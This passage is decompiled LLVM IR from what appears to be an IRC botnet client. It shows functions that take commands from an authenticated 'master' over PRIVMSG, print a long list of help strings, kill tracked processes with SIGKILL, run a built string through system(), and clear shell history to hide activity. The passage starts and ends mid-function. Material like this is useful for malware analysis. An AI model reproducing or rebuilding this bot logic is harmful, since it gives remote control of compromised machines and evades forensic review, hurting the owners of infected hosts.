  uselistorder label %dec_label_pc_1000fd2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd10.dec_label_pc_1000fd48_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000fcf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc44, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_100102d4 = call i32 @mfork(i32 %arg2)
  %v3_100102dc = icmp eq i32 %v1_100102d4, 0
  br i1 %v3_100102dc, label %dec_label_pc_100102e4, label %dec_label_pc_100108ec

dec_label_pc_100102e4:                            ; preds = %entry
  %v6_100102f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_1002c36c.763 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501764, i32* @lr, align 4
  %v1_10010300 = call i32 @sleep(i32 3)
  %v6_10010318 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_1002c3a4.765 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501796, i32* @lr, align 4
  %v1_10010320 = call i32 @sleep(i32 1)
  %v6_10010338 = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_1002c3ec.767 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501828, i32* @lr, align 4
  %v1_10010340 = call i32 @sleep(i32 1)
  %v6_10010358 = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_1002c440.769 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501860, i32* @lr, align 4
  %v1_10010360 = call i32 @sleep(i32 1)
  %v6_10010378 = call i32 @Send(i32 %arg1, i32 ptrtoint ([74 x i8]* @global_var_1002c494.771 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501892, i32* @lr, align 4
  %v1_10010380 = call i32 @sleep(i32 1)
  %v6_10010398 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1002c4e0.773 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501924, i32* @lr, align 4
  %v1_100103a0 = call i32 @sleep(i32 1)
  %v6_100103b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([143 x i8]* @global_var_1002c52c.775 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501956, i32* @lr, align 4
  %v1_100103c0 = call i32 @sleep(i32 1)
  %v6_100103d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_1002c5bc.777 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268501988, i32* @lr, align 4
  %v1_100103e0 = call i32 @sleep(i32 1)
  %v6_100103f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([60 x i8]* @global_var_1002c628.779 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502020, i32* @lr, align 4
  %v1_10010400 = call i32 @sleep(i32 1)
  %v6_10010418 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1002c664.781 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502052, i32* @lr, align 4
  %v1_10010420 = call i32 @sleep(i32 3)
  %v6_10010438 = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_1002c688.783 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502084, i32* @lr, align 4
  %v1_10010440 = call i32 @sleep(i32 1)
  %v6_10010458 = call i32 @Send(i32 %arg1, i32 ptrtoint ([124 x i8]* @global_var_1002c6c4.785 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502116, i32* @lr, align 4
  %v1_10010460 = call i32 @sleep(i32 1)
  %v6_10010478 = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_1002c740.787 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502148, i32* @lr, align 4
  %v1_10010480 = call i32 @sleep(i32 1)
  %v6_10010498 = call i32 @Send(i32 %arg1, i32 ptrtoint ([166 x i8]* @global_var_1002c7ac.789 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502180, i32* @lr, align 4
  %v1_100104a0 = call i32 @sleep(i32 1)
  %v6_100104b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([95 x i8]* @global_var_1002c854.791 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502212, i32* @lr, align 4
  %v1_100104c0 = call i32 @sleep(i32 1)
  %v6_100104d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([141 x i8]* @global_var_1002c8b4.793 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502244, i32* @lr, align 4
  %v1_100104e0 = call i32 @sleep(i32 1)
  %v6_100104f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_1002c944.795 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502276, i32* @lr, align 4
  %v1_10010500 = call i32 @sleep(i32 1)
  %v6_10010518 = call i32 @Send(i32 %arg1, i32 ptrtoint ([152 x i8]* @global_var_1002c99c.797 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502308, i32* @lr, align 4
  %v1_10010520 = call i32 @sleep(i32 1)
  %v6_10010538 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_1002ca34.799 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502340, i32* @lr, align 4
  %v1_10010540 = call i32 @sleep(i32 1)
  %v6_10010558 = call i32 @Send(i32 %arg1, i32 ptrtoint ([159 x i8]* @global_var_1002caa8.801 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502372, i32* @lr, align 4
  %v1_10010560 = call i32 @sleep(i32 1)
  %v6_10010578 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002cb48.803 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502404, i32* @lr, align 4
  %v1_10010580 = call i32 @sleep(i32 3)
  %v6_10010598 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002cb64.805 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502436, i32* @lr, align 4
  %v1_100105a0 = call i32 @sleep(i32 1)
  %v6_100105b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([61 x i8]* @global_var_1002cb9c.807 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502468, i32* @lr, align 4
  %v1_100105c0 = call i32 @sleep(i32 1)
  %v6_100105d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_1002cbdc.809 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502500, i32* @lr, align 4
  %v1_100105e0 = call i32 @sleep(i32 1)
  %v6_100105f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002cc10.811 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502532, i32* @lr, align 4
  %v1_10010600 = call i32 @sleep(i32 1)
  %v6_10010618 = call i32 @Send(i32 %arg1, i32 ptrtoint ([63 x i8]* @global_var_1002cc48.813 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502564, i32* @lr, align 4
  %v1_10010620 = call i32 @sleep(i32 1)
  %v6_10010638 = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_1002cc88.815 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502596, i32* @lr, align 4
  %v1_10010640 = call i32 @sleep(i32 1)
  %v6_10010658 = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_1002cccc.817 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502628, i32* @lr, align 4
  %v1_10010660 = call i32 @sleep(i32 1)
  %v6_10010678 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_1002cd0c.819 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502660, i32* @lr, align 4
  %v1_10010680 = call i32 @sleep(i32 1)
  %v6_10010698 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002cd34.821 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502692, i32* @lr, align 4
  %v1_100106a0 = call i32 @sleep(i32 1)
  %v6_100106b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_1002cd54.823 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502724, i32* @lr, align 4
  %v1_100106c0 = call i32 @sleep(i32 1)
  %v6_100106d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_1002cdbc.825 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502756, i32* @lr, align 4
  %v1_100106e0 = call i32 @sleep(i32 1)
  %v6_100106f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([108 x i8]* @global_var_1002ce00.827 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502788, i32* @lr, align 4
  %v1_10010700 = call i32 @sleep(i32 1)
  %v6_10010718 = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_1002ce6c.829 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502820, i32* @lr, align 4
  %v1_10010720 = call i32 @sleep(i32 1)
  %v6_10010738 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002cea4.831 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502852, i32* @lr, align 4
  %v1_10010740 = call i32 @sleep(i32 1)
  %v6_10010758 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002cedc.833 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502884, i32* @lr, align 4
  %v1_10010760 = call i32 @sleep(i32 1)
  %v6_10010778 = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_1002cf04.835 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502916, i32* @lr, align 4
  %v1_10010780 = call i32 @sleep(i32 1)
  %v6_10010798 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_1002cf48.837 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502948, i32* @lr, align 4
  %v1_100107a0 = call i32 @sleep(i32 1)
  %v6_100107b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_1002cf7c.839 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268502980, i32* @lr, align 4
  %v1_100107c0 = call i32 @sleep(i32 1)
  %v6_100107d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_1002cfc0.841 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503012, i32* @lr, align 4
  %v1_100107e0 = call i32 @sleep(i32 1)
  %v6_100107f8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_1002d008.843 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503044, i32* @lr, align 4
  %v1_10010800 = call i32 @sleep(i32 1)
  %v6_10010818 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_1002d044.845 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503076, i32* @lr, align 4
  %v1_10010820 = call i32 @sleep(i32 1)
  %v6_10010838 = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_1002d0a0.847 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503108, i32* @lr, align 4
  %v1_10010840 = call i32 @sleep(i32 1)
  %v6_10010858 = call i32 @Send(i32 %arg1, i32 ptrtoint ([88 x i8]* @global_var_1002d0dc.849 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503140, i32* @lr, align 4
  %v1_10010860 = call i32 @sleep(i32 1)
  %v6_10010878 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1002d134.851 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503172, i32* @lr, align 4
  %v1_10010880 = call i32 @sleep(i32 1)
  %v6_10010898 = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_1002d194.853 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503204, i32* @lr, align 4
  %v1_100108a0 = call i32 @sleep(i32 1)
  %v6_100108b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_1002d1e4.855 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 268503236, i32* @lr, align 4
  %v1_100108c0 = call i32 @sleep(i32 1)
  %v6_100108d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([111 x i8]* @global_var_1002d24c.857 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 ptrtoint ([3 x i8]* @global_var_100108e4.859 to i32), i32* @lr, align 4
  %v1_100108e0 = call i32 @sleep(i32 1)
  %v0_100108e8 = call i32 @__GI_exit()
  br label %dec_label_pc_100108ec

dec_label_pc_100108ec:                            ; preds = %entry, %dec_label_pc_100102e4
  %v0_10010900 = phi i32 [ %v1_100102d4, %entry ], [ %v0_100108e8, %dec_label_pc_100102e4 ]
  ret i32 %v0_10010900

; uselistorder directives
  uselistorder label %dec_label_pc_100108ec, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_1001091c = load i32, i32* %r3.global-to-local, align 4
  %v3_10010a042 = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10010a0c3 = icmp eq i32 %v3_10010a042, 0
  br i1 %v2_10010a0c3, label %dec_label_pc_10010a14, label %dec_label_pc_10010938.lr.ph

dec_label_pc_10010938.lr.ph:                      ; preds = %entry
  %v3_1001098c = icmp eq i32 %arg2, 0
  br label %dec_label_pc_10010938

dec_label_pc_10010938:                            ; preds = %dec_label_pc_10010938.lr.ph, %dec_label_pc_100109f4
  %v0_10010a2c9 = phi i32 [ %v0_1001091c, %dec_label_pc_10010938.lr.ph ], [ %v0_10010a2c8, %dec_label_pc_100109f4 ]
  %storemerge15 = phi i32 [ 0, %dec_label_pc_10010938.lr.ph ], [ %v1_100109f8, %dec_label_pc_100109f4 ]
  %v1_1001093c = mul i32 %storemerge15, 4
  %v3_10010948 = load i32, i32* @global_var_100451ac.27, align 4
  %v2_1001094c = add i32 %v3_10010948, %v1_1001093c
  %v1_10010950 = inttoptr i32 %v2_1001094c to i32*
  %v2_10010950 = load i32, i32* %v1_10010950, align 4
  %v3_10010954 = icmp eq i32 %v2_10010950, 0
  br i1 %v3_10010954, label %dec_label_pc_100109f4, label %dec_label_pc_1001095c

dec_label_pc_1001095c:                            ; preds = %dec_label_pc_10010938
  %v2_10010974 = load i32, i32* %v1_10010950, align 4
  store i32 268503420, i32* @lr, align 4
  %v0_10010978 = call i32 @__libc_getpid()
  store i32 %v0_10010978, i32* %r3.global-to-local, align 4
  %v4_10010980 = icmp eq i32 %v2_10010974, %v0_10010978
  br i1 %v4_10010980, label %dec_label_pc_100109f4, label %dec_label_pc_10010988

dec_label_pc_10010988:                            ; preds = %dec_label_pc_1001095c
  br i1 %v3_1001098c, label %dec_label_pc_100109cc, label %dec_label_pc_10010994

dec_label_pc_10010994:                            ; preds = %dec_label_pc_10010988
  %v3_100109a4 = load i32, i32* @global_var_100451ac.27, align 4
  %v2_100109a8 = add i32 %v3_100109a4, %v1_1001093c
  %v1_100109ac = inttoptr i32 %v2_100109a8 to i32*
  %v2_100109ac = load i32, i32* %v1_100109ac, align 4
  store i32 %v0_1001091c, i32* %r3.global-to-local, align 4
  %v6_100109c8 = call i32 @Send(i32 %v0_1001091c, i32 ptrtoint ([28 x i8]* @global_var_1002d2bc.860 to i32), i32 %arg2, i32 %v2_100109ac)
  store i32 %v6_100109c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100109cc

dec_label_pc_100109cc:                            ; preds = %dec_label_pc_10010988, %dec_label_pc_10010994
  %v3_100109dc = load i32, i32* @global_var_100451ac.27, align 4
  %v2_100109e0 = add i32 %v3_100109dc, %v1_1001093c
  %v1_100109e4 = inttoptr i32 %v2_100109e0 to i32*
  %v2_100109e4 = load i32, i32* %v1_100109e4, align 4
  store i32 %v2_100109e4, i32* %r3.global-to-local, align 4
  store i32 268503540, i32* @lr, align 4
  %v2_100109f0 = call i32 @kill(i32 %v2_100109e4, i32 9)
  store i32 %v2_100109f0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100109f4

dec_label_pc_100109f4:                            ; preds = %dec_label_pc_1001095c, %dec_label_pc_10010938, %dec_label_pc_100109cc
  %v0_10010a2c8 = phi i32 [ %v0_10010978, %dec_label_pc_1001095c ], [ %v0_10010a2c9, %dec_label_pc_10010938 ], [ %v2_100109f0, %dec_label_pc_100109cc ]
  %v1_100109f8 = add i32 %storemerge15, 1
  %v3_10010a04 = load i32, i32* @global_var_1004515c.26, align 4
  %v2_10010a0c = icmp ult i32 %v1_100109f8, %v3_10010a04
  br i1 %v2_10010a0c, label %dec_label_pc_10010938, label %dec_label_pc_10010a00.dec_label_pc_10010a14_crit_edge

dec_label_pc_10010a00.dec_label_pc_10010a14_crit_edge: ; preds = %dec_label_pc_100109f4
  br label %dec_label_pc_10010a14

dec_label_pc_10010a14:                            ; preds = %entry, %dec_label_pc_10010a00.dec_label_pc_10010a14_crit_edge
  %v0_10010a2c = phi i32 [ %v0_10010a2c8, %dec_label_pc_10010a00.dec_label_pc_10010a14_crit_edge ], [ %v0_1001091c, %entry ]
  ret i32 %v0_10010a2c

; uselistorder directives
  uselistorder i32 %v1_1001093c, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v0_1001091c, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_10010a14, { 1, 0 }
  uselistorder label %dec_label_pc_100109f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100109cc, { 1, 0 }
  uselistorder label %dec_label_pc_10010938, { 1, 0 }
}

define i32 @killd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1048 = alloca i32, align 4
  %v2_10010a54 = ptrtoint i32* %stack_var_-1048 to i32
  store i32 %v2_10010a54, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268503660, i32* @lr, align 4
  %v0_10010a68 = call i32 @__GI_memset()
  %v3_10010a70 = load i8, i8* @global_var_10045150.22, align 1
  %v3_10010a78 = icmp eq i8 %v3_10010a70, 1
  br i1 %v3_10010a78, label %dec_label_pc_10010ab8, label %dec_label_pc_10010a80

dec_label_pc_10010a80:                            ; preds = %entry
  store i32 %v2_10010a54, i32* @r3, align 4
  store i32 268503716, i32* @lr, align 4
  %v1_10010aa0 = call i32 @sprintf(i32 %v2_10010a54)
  store i32 ptrtoint ([3 x i8]* @global_var_10010ab0.863 to i32), i32* @lr, align 4
  %v1_10010aac = call i32 @system(i32 %v2_10010a54)
  %v0_10010ab4 = call i32 @__GI_exit()
  br label %dec_label_pc_10010ab8

dec_label_pc_10010ab8:                            ; preds = %entry, %dec_label_pc_10010a80
  %v0_10010acc = phi i32 [ %v0_10010a68, %entry ], [ %v0_10010ab4, %dec_label_pc_10010a80 ]
  ret i32 %v0_10010acc

; uselistorder directives
  uselistorder i32 %v2_10010a54, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @system, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10010ab8, { 1, 0 }
}

define i32 @append(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_10010af4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010af4, i32* @r3, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002d2f0.864 to i32), i32* @r4, align 4
  store i32 268503828, i32* @lr, align 4
  %v7_10010b10 = call i32 @__GI_asprintf(i32 %v2_10010af4, i32 ptrtoint ([5 x i8]* @global_var_1002d2f0.864 to i32), i32 %arg1, i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_10010b14 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10010b14

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
}

define i32 @ismaster(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_10010bd84 = icmp sgt i32 %arg3, 0
  br i1 %v2_10010bd84, label %dec_label_pc_10010b60, label %dec_label_pc_10010be8

dec_label_pc_10010b60:                            ; preds = %entry, %dec_label_pc_10010bc4
  %storemerge27 = phi i32 [ %v1_10010bc8, %dec_label_pc_10010bc4 ], [ 0, %entry ]
  %v1_10010b64 = mul i32 %storemerge27, 4
  %v2_10010b70 = add i32 %v1_10010b64, %arg2
  %v1_10010b74 = inttoptr i32 %v2_10010b70 to i32*
  %v2_10010b74 = load i32, i32* %v1_10010b74, align 4
  %v4_10010b84 = call i32 @append(i32 %v2_10010b74, i32 ptrtoint (i32* @global_var_1002d2f8.865 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  store i32 %v4_10010b84, i32* @r3, align 4
  %v0_10010b94 = call i32 @__GI_strlen()
  store i32 %arg1, i32* @r4, align 4
  %v3_10010ba8 = inttoptr i32 %v4_10010b84 to i8*
  %v4_10010ba8 = call i32 @__GI_strncmp(i8* %v3_10010ba8, i32 %arg1, i32 %v0_10010b94)
  %v3_10010bb0 = icmp eq i32 %v4_10010ba8, 0
  br i1 %v3_10010bb0, label %dec_label_pc_10010be8.loopexit, label %dec_label_pc_10010bc4

dec_label_pc_10010bc4:                            ; preds = %dec_label_pc_10010b60
  %v1_10010bc8 = add nuw nsw i32 %storemerge27, 1
  %v2_10010bd8 = icmp slt i32 %v1_10010bc8, %arg3
  br i1 %v2_10010bd8, label %dec_label_pc_10010b60, label %dec_label_pc_10010be8.loopexit

dec_label_pc_10010be8.loopexit:                   ; preds = %dec_label_pc_10010bc4, %dec_label_pc_10010b60
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_10010b60 ], [ 0, %dec_label_pc_10010bc4 ]
  br label %dec_label_pc_10010be8

dec_label_pc_10010be8:                            ; preds = %dec_label_pc_10010be8.loopexit, %entry
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.ph, %dec_label_pc_10010be8.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10010bc8, { 1, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10010b60, { 1, 0 }
}

define i32 @histClear(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 268504112, i32* @lr, align 4
  %v0_10010c2c = call i32 @ClearHistory()
  %v6_10010c44 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002d2fc.866 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  ret i32 %v6_10010c44
}

define i32 @_PRIVMSG(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-2200 = alloca i32, align 4
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-2092 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10010c60 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10010c60, i32* %stack_var_-2208, align 4
  %v3_10010c88 = load i32, i32* @global_var_100450a4.867, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_10010c9c = call i32 @ismaster(i32 %arg2, i32 ptrtoint ([2 x i8*]* @global_var_100450a8.870 to i32), i32 %v3_10010c88, i32 268697600)
  store i32 %v5_10010c9c, i32* %r3.global-to-local, align 4
  %v3_10010ca4 = icmp eq i32 %v5_10010c9c, 0
  br i1 %v3_10010ca4, label %dec_label_pc_10011c60, label %dec_label_pc_10010cc4.preheader

dec_label_pc_10010cc4.preheader:                  ; preds = %entry
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_10010ccc106 = call i32 @__GI_strlen()
  store i32 %v0_10010ccc106, i32* %r3.global-to-local, align 4
  %v0_10010cd4107 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010cd4108 = icmp ult i32 %v0_10010cd4107, %v0_10010ccc106
  br i1 %v2_10010cd4108, label %dec_label_pc_10010cdc, label %dec_label_pc_10010cfc

dec_label_pc_10010cb8:                            ; preds = %dec_label_pc_10010cdc
  %v1_10010cbc = add i32 %storemerge8111, 1
  store i32 %v1_10010cbc, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_10010ccc = call i32 @__GI_strlen()
  store i32 %v0_10010ccc, i32* %r3.global-to-local, align 4
  %v0_10010cd4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010cd4 = icmp ult i32 %v0_10010cd4, %v0_10010ccc
  br i1 %v2_10010cd4, label %dec_label_pc_10010cdc, label %dec_label_pc_10010cfc

dec_label_pc_10010cdc:                            ; preds = %dec_label_pc_10010cc4.preheader, %dec_label_pc_10010cb8
  %storemerge8111 = phi i32 [ %v1_10010cbc, %dec_label_pc_10010cb8 ], [ 0, %dec_label_pc_10010cc4.preheader ]
  %v2_10010ce8 = add i32 %storemerge8111, %arg3
  %v1_10010cec = inttoptr i32 %v2_10010ce8 to i8*
  %v2_10010cec = load i8, i8* %v1_10010cec, align 1
  %v3_10010cf4 = icmp eq i8 %v2_10010cec, 32
  br i1 %v3_10010cf4, label %dec_label_pc_10010cfc, label %dec_label_pc_10010cb8

dec_label_pc_10010cfc:                            ; preds = %dec_label_pc_10010cb8, %dec_label_pc_10010cdc, %dec_label_pc_10010cc4.preheader
  %storemerge8.lcssa = phi i32 [ 0, %dec_label_pc_10010cc4.preheader ], [ %v1_10010cbc, %dec_label_pc_10010cb8 ], [ %storemerge8111, %dec_label_pc_10010cdc ]
  %v2_10010d08 = add i32 %storemerge8.lcssa, %arg3
  %v3_10010d10 = inttoptr i32 %v2_10010d08 to i8*
  store i8 0, i8* %v3_10010d10, align 1
  %v1_10010d2c = add i32 %v2_10010d08, 2
  %v5_10010d30 = inttoptr i32 %v1_10010d2c to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_10010d5498 = call i32 @__GI_strlen()
  store i32 %v0_10010d5498, i32* %r3.global-to-local, align 4
  %v0_10010d5c99 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010d5c100 = icmp ult i32 %v0_10010d5c99, %v0_10010d5498
  br i1 %v2_10010d5c100, label %dec_label_pc_10010d64, label %dec_label_pc_10010d84

dec_label_pc_10010d40:                            ; preds = %dec_label_pc_10010d64
  %v1_10010d44 = add i32 %storemerge9103, 1
  store i32 %v1_10010d44, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_10010d54 = call i32 @__GI_strlen()
  store i32 %v0_10010d54, i32* %r3.global-to-local, align 4
